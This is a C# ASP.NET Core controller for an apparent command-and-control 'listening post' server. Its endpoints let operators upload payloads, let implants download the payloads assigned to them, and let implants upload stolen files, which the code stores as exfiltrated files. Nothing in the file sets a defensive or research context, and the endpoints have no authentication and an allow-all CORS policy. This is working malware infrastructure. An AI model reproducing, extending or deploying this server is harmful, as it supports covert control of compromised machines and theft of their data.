using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using ListeningPostApiServer.Interfaces;
using ListeningPostApiServer.Models;
using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace ListeningPostApiServer.Controllers
{
    /// <inheritdoc />
    /// <summary>
    ///     An Api Controller to provide RESTful CRUD operations for Files hosted on the Listening Post.
    ///     Implements the <see cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    /// </summary>
    /// <seealso cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    [Produces("application/json", "application/octet-stream")]
    [Route("[controller]")]
    [EnableCors("AllowAll")]
    [ApiController]
    [ProducesErrorResponseType(typeof(NotFoundResult))]
    public class FileController : ControllerBase
    {
        #region Constructors

        /// <summary>
        /// </summary>
        /// <param name="filesRepo"></param>
        /// <param name="implantRepo"></param>
        /// <param name="exFiles"></param>
        /// <param name="payloadRepo"></param>
        public FileController(IRepository<FileBase> filesRepo, IRepository<Implant> implantRepo,
            IRepository<ExfiltratedFile> exFiles, IRepository<PayloadFile> payloadRepo)
        {
            _files = filesRepo;
            _implantRepository = implantRepo;
            _exFiles = exFiles;
            _payload = payloadRepo;
        }

        #endregion Constructors

        #region Fields

        /// <summary>
        ///     Holds the file repository Implementation to be consumed by other methods.
        /// </summary>
        private readonly IRepository<FileBase> _files;

        private readonly IRepository<Implant> _implantRepository;
        private readonly IRepository<ExfiltratedFile> _exFiles;
        private readonly IRepository<PayloadFile> _payload;

        #endregion Fields

        #region Methods

        /// <summary>
        ///     Downloads the specified file.
        /// </summary>
        /// <param name="id">The file identifier (Guid).</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Reliable only in certain instances, needs work.</remarks>
        [HttpGet("download/{id:guid}")]
        public async Task<IActionResult> Download(Guid id)
        {
            var fileToSend = await _files.GetAsync(id);

            if (fileToSend == null)
                return NotFound(new {message = "requested file id is not found"});

            return File(new FileStream(fileToSend.TempFilePath, FileMode.Open), "application/octet-stream",
                fileToSend.ActualFileName);
        }

        /// <summary>
        ///     Retrieves metadata for a particular file stored on the server, or all files if the Guid
        ///     is not specified.
        /// </summary>
        /// <param name="id">The identifier.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        [HttpGet("{id:guid?}")]
        public async Task<IActionResult> Get(Guid? id)
        {
            if (!id.HasValue) return Ok(await _files.GetAsync());

            var file = await _files.GetAsync(id.Value);

            return file == null
                ? NotFound(new {message = "The requested file does not exist"})
                : Ok(file);
        }

        /// <summary>
        ///     Provides a download mechanism for agents to retrieve files assigned to them, stored in
        ///     the Listening Post.
        /// </summary>
        /// <param name="nodeId">       The node (agent/implant) identifier.</param>
        /// <param name="fileRequested">The file requested.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Meant for Agent use.</remarks>
        [HttpPost("push/{nodeId:int}")]
        public async Task<IActionResult> Push([FromRoute] int nodeId, [FromBody] FileBase fileRequested)
        {
            var node = await _implantRepository.GetAsync(nodeId);
            var assignedFile = node?.PayloadFile;

            var fileToSend = assignedFile;

            if (assignedFile == null)
            {
                var requestedFile = (await _payload.GetAsync(f => f.ActualFileName == fileRequested.ActualFileName))
                    .FirstOrDefault();

                if (requestedFile == null)
                    return BadRequest();

                fileToSend = requestedFile;
            }

            if (fileToSend == null)
                return Ok();

            return File(new FileStream(fileToSend.TempFilePath, FileMode.Open), "application/octet-stream",
                fileToSend.ActualFileName);
        }

        /// <summary>
        ///     Directly uploads a file to the server, bypassing associating with an agent.
        /// </summary>
        /// <param name="file">The file.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Meant for user access</remarks>
        [HttpPost("upload")]
        public async Task<IActionResult> Upload(IFormFile file)
        {
            if (file.Length <= 0) return BadRequest();

            var filePath = Path.GetTempFileName();

            await using (var stream = new FileStream(filePath, FileMode.Create))
            {
                await file.CopyToAsync(stream);
            }

            var newExFile = new PayloadFile
            {
                TempFilePath = filePath,
                ActualFileName = file.FileName
            };

            var newFile = await _payload.AddAsync(newExFile);

            return Ok(newFile);
        }

        /// <summary>
        ///     Uploads a File to the server, registering which Agent Uploaded it.
        /// </summary>
        /// <param name="nodeId">The node identifier.</param>
        /// <param name="file">  The file.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Meant to be used by Agents.</remarks>
        [HttpPost("pull/{nodeId:int}")]
        public async Task<IActionResult> UploadToServer(int nodeId, IFormFile file)
        {
            //if (file.Length <= 0) return BadRequest();
            var implant = await _implantRepository.GetAsync(nodeId);

            if (implant == null)
                return NotFound(new {message = "your implant id does not exist"});

            var filePath = Path.GetTempFileName();

            await using (var stream = new FileStream(filePath, FileMode.Create))
            {
                await file.CopyToAsync(stream);
            }

            var newExFile = new ExfiltratedFile
            {
                TempFilePath = filePath,
                FromImplant = implant,
                ActualFileName = file.FileName
            };

            await _exFiles.AddAsync(newExFile);

            return Ok();
        }

        #endregion Methods
    }
}